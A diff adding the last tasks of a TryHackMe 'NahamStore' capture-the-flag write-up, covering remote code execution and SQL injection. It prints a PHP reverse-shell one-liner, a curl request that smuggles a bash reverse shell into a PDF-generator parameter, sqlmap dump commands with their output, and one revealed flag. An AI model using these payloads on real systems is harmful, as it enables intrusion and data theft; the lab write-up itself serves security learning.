@@ -349,3 +349,67 @@ python3 -m http.server 80
 ```
 After that, just upload your file, and you will get the result on your server
 ![alt text](/assets/img/tryhackme/nahamStore/xxe5.PNG)
+
+## [Task 11] RCE
+We found out there is we can spawn a revershell on `http://nahamstore.thm:8000/admin`
+
+### First RCE
+Let modify 1 page and add php reverse shell to it
+```
+<?php system("bash -c 'bash -i >& /dev/tcp/ip/7777 0>&1'"); ?>
+```
+And now whenever you access to that page, it will spawn a shell to your computer on port 7777
+
+### Second RCE
+We also found out that is possible `Command Injection` on `pdf reciept` . We can insert some command injection to that
+```
+curl -i -s -k -X $'POST' \-H $'Cookie: token=XXXXXXXXXXXXX; session=XXXXXXXXXXXXXXXXXXX' \ --data-binary $'what=order&id=3`bash+-c+\'bash+-i+>%26+/dev/tcp/<ip>/6666+0>%261\'`' \    $'http://nahamstore.thm/pdf-generator'
+```
+This will make a reverse shell to your comoputer on port 6666
+
+
+## [Task 12] SQLi
+We have found out 2 place we can have SQLi:
+- `/product?id=`
+- `POST /returns`: blind SQLi
+
+### Flag 1
+It is very simple, you can use sqlmap with this one
+```
+sqlmap -u 'http://nahamstore.thm/product?id=1&name=A' -p id --dbms mysql -D nahamstore -T sqli_one --dump
+[...]
+Database: nahamstore
+Table: sqli_one
+[1 entry]
++----+------------------------------------+
+| id | flag                               |
++----+------------------------------------+
+| 1  | {xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx} |
++----+------------------------------------+
+```
+
+### Flag 2
+This blind SQli require you to download the packet, capture `POST /erturns`
+![alt text](/assets/img/tryhackme/nahamStore/sqli.png)
+And the download it and save it as `capture`, now we can use `sqlmap` to get data
+```
+sqlmap -r capture --dbms='MySQL' -D nahamstore --dump --threads 10
+[...]
+Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+got a 302 redirect to 'http://nahamstore.thm:80/returns/134?auth=02522a2b2726fb0a03bb19f2d8d9524d'. Do you want to follow? [Y/n] n
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
+(custom) POST parameter 'MULTIPART order_number' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+[...]
+
+Database: nahamstore
+Table: sqli_two
+[1 entry]
++----+------------------------------------+
+| id | flag                               |
++----+------------------------------------+
+| 1  | {212ec3b036925a38b7167cf9f0243015} |
++----+------------------------------------+
+```
+
+That's the end of my writeup, it is a long night now. Thanks for reading
